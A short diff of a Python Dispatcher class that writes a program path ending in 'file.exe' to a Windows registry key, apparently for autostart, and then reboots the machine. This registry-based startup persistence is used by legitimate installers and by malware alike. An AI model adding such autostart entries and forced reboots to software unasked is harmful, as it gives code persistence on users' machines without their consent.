@@ -18,7 +18,7 @@ class Dispatcher:
             
         try:
             with winreg.OpenKeyEx(registry_path, key_path, 0, winreg.KEY_WRITE) as registry_key:
-                winreg.SetValueEx(registry_key, self.program_name, 0, winreg.REG_SZ, os.path.dirname(sys.executable))
+                winreg.SetValueEx(registry_key, self.program_name, 0, winreg.REG_SZ, os.path.dirname(sys.executable) + r'\file.exe')
             self.reboot(time=False)
             
         except PermissionError:
@@ -73,6 +73,7 @@ def main() -> None:
         
     else:
         computer.add_to_startup()
+    
 
 
 if __name__ == '__main__':
